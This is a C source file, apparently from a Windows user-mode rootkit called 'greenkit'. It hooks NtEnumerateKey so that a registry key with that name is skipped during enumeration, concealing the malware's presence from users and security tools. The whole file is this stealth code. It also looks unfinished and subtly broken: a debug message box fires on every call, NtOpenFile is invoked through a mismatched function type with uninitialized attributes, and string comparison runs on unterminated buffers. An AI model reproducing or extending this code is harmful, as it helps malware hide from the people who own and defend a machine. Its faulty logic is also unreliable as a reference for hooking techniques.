#include "stdafx.h"

#include "NtEnumerateKey.h"
#include <windows.h>
#include "hooking.h"

BOOL mustShiftReg(UNICODE_STRING uStr_reg) {
	if (wcscmp((uStr_reg.Buffer), L"greenkit") <= 0)
		return TRUE;
	return FALSE;
}

BOOL mustHideReg(UNICODE_STRING uStr_reg) {
	if (wcscmp(uStr_reg.Buffer, L"greenkit") == 0)
		return TRUE;
	return FALSE;
}

PVOID getKeyName(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
	if (KeyInformationClass == KeyBasicInformation)
		return (PVOID) &(((PKEY_BASIC_INFORMATION)KeyInformation)->Name);
	else if (KeyInformationClass == KeyNodeInformation)
		return (PVOID) &(((PKEY_NODE_INFORMATION)KeyInformation)->Name);
	return NULL;
}

ULONG getKeyNameLength(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
	if (KeyInformationClass == KeyBasicInformation)
		return ((PKEY_BASIC_INFORMATION)KeyInformation)->NameLength;
	else if (KeyInformationClass == KeyNodeInformation)
		return ((PKEY_NODE_INFORMATION)KeyInformation)->NameLength;
	return 0;
}

NTSTATUS NTAPI NewNtEnumerateKey(
	HANDLE					KeyHandle,
	ULONG					Index,
	KEY_INFORMATION_CLASS	KeyInformationClass,
	PVOID					KeyInformation,
	ULONG					Length,
	PULONG					ResultLength)
{
	NTSTATUS ret;
	UNICODE_STRING uStr_tmp;
	ULONG tmpIndex;
	HANDLE h_tmp;
	OBJECT_ATTRIBUTES ObjectAttributes;

	MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);

	ret = ((TD_NtEnumerateKey)hooking_getOldFunction("NtEnumerateKey")) (KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);

	if (!(KeyInformationClass == KeyBasicInformation || KeyInformationClass == KeyNodeInformation))
		return ret;
	else if (!NT_SUCCESS(ret))
		return ret;

	uStr_tmp.Buffer = (PWSTR) getKeyName(KeyInformation, KeyInformationClass);
	uStr_tmp.Length = (USHORT) getKeyNameLength(KeyInformation, KeyInformationClass);

	if (!mustShiftReg(uStr_tmp)) // TODO change this part for more than one key to hide
		return ret;
	else {
		TD_NtOpenKey _NtOpenFile = (TD_NtOpenKey) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenFile");
		if (!NT_SUCCESS(_NtOpenFile(&h_tmp, GENERIC_READ, &ObjectAttributes)))
			return ret;
	}

	CloseHandle(h_tmp);

	tmpIndex = Index + 1;
	ret = ((TD_NtEnumerateKey)hooking_getOldFunction("NtEnumerateKey")) (KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
	if (ret != STATUS_SUCCESS)
		return ret;
	
	uStr_tmp.Buffer = (PWSTR) getKeyName(KeyInformation, KeyInformationClass);
	uStr_tmp.Length = (USHORT) getKeyNameLength(KeyInformation, KeyInformationClass);

	if (mustHideReg(uStr_tmp))
		++tmpIndex;

	return ((TD_NtEnumerateKey)hooking_getOldFunction("NtEnumerateKey")) (KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
}